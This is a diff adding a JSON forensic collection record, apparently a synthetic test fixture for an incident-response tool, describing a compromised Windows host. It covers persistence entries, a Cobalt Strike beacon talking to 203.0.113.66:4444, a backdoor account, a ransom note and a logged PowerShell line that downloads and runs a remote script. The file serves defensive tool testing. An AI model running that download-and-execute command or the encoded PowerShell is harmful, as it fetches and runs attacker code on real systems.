@@ -1,0 +1,74 @@
+{
+  "schemaVersion": "3.0.0",
+  "metadata": {
+    "caseId": "FOS-20260619-VICTIM01-cc33dd",
+    "collectionTimestampUtc": "2026-06-19T12:30:00.000Z",
+    "targetHostname": "VICTIM01",
+    "platform": "windows",
+    "osVersion": "Windows 10 Pro 19045",
+    "collectorVersion": "3.0.0",
+    "executionMode": "local",
+    "evidenceIntegrityMode": true,
+    "operator": { "user": "MSP\\analyst", "host": "ANALYST01", "tool": "First-On-Scene/3.0.0" }
+  },
+  "artifacts": {
+    "persistence": {
+      "registryRunKeys": [
+        { "hive": "HKCU", "keyPath": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "valueName": "Updater", "valueData": "C:\\Users\\bob\\AppData\\Roaming\\svchost.exe" }
+      ],
+      "scheduledTasks": [
+        { "taskName": "SystemUpdateCheck", "path": "\\", "state": "Ready", "enabled": true, "author": "bob", "actions": "C:\\Users\\bob\\AppData\\Local\\Temp\\beacon.exe", "triggers": "Daily" }
+      ],
+      "services": [
+        { "name": "WinHelpSvc", "displayName": "Windows Helper", "state": "Running", "startMode": "Auto", "pathName": "C:\\ProgramData\\winhelp\\whost.exe" }
+      ],
+      "wmiEventSubscriptions": {
+        "eventFilters": [ { "name": "FilterTimer" } ],
+        "eventConsumers": [ { "name": "EvilConsumer", "commandLineTemplate": "powershell -enc ZQBjAGgAbwA=" } ],
+        "filterBindings": [ { "filter": "FilterTimer", "consumer": "EvilConsumer" } ]
+      }
+    },
+    "execution": {
+      "processes": [
+        { "processId": 6610, "name": "beacon.exe", "executablePath": "C:\\Windows\\Temp\\beacon.exe", "commandLine": "beacon.exe -c1", "parentProcessId": 500, "user": "VICTIM01\\bob" }
+      ],
+      "processCreationEvents": [
+        { "eventId": 4688, "timestamp": "2026-06-19T11:55:00Z", "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "commandLine": "powershell -nop -w hidden -enc ...", "parentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "user": "VICTIM01\\bob" }
+      ]
+    },
+    "network": {
+      "connections": [
+        { "protocol": "TCP", "localAddress": "192.168.1.77", "localPort": 49888, "remoteAddress": "203.0.113.66", "remotePort": 4444, "state": "Established", "processId": 6610, "processName": "beacon.exe" }
+      ]
+    },
+    "credentialAccess": {
+      "logonEvents": [
+        { "eventId": 4624, "timestamp": "2026-06-19T11:50:00Z", "logonType": 5, "account": "NT AUTHORITY\\SYSTEM", "sourceAddress": "-", "message": "Service logon" },
+        { "eventId": 4672, "timestamp": "2026-06-19T11:50:01Z", "logonType": 0, "account": "VICTIM01\\bob", "sourceAddress": "-", "message": "Special privileges" }
+      ],
+      "privilegeEscalationEvents": [
+        { "eventId": 4672, "timestamp": "2026-06-19T11:50:01Z", "user": "VICTIM01\\bob", "privileges": "SeDebugPrivilege,SeTcbPrivilege" }
+      ],
+      "userCreationEvents": [
+        { "eventId": 4720, "timestamp": "2026-06-19T11:58:00Z", "message": "A user account was created: backdoor_admin" }
+      ],
+      "serviceInstallEvents": []
+    },
+    "fileSystem": {
+      "fileMetadata": [
+        { "fileName": "C:\\Users\\bob\\Desktop\\HOW_TO_DECRYPT.txt", "size": 1820, "modified": "2026-06-19T11:59:00Z", "accessed": "2026-06-19T11:59:00Z", "created": "2026-06-19T11:59:00Z" },
+        { "fileName": "C:\\Windows\\Temp\\beacon.exe", "size": 240128, "modified": "2026-06-01T00:00:00Z", "accessed": "2026-06-19T11:55:00Z", "created": "2026-06-19T11:54:00Z" }
+      ],
+      "browserArtifacts": []
+    },
+    "powerShellActivity": {
+      "scriptBlockLogs": [
+        { "timestamp": "2026-06-19T11:55:10Z", "scriptBlock": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.66/a.ps1')", "path": "" }
+      ]
+    },
+    "antivirusScans": {
+      "defenderScan": { "executed": true, "threatsFound": 1, "threats": [ { "name": "Trojan:Win32/CobaltStrike", "file": "C:\\Windows\\Temp\\beacon.exe" } ] },
+      "clamavScan": { "executed": false, "threatsFound": 0, "threats": [] }
+    }
+  }
+}
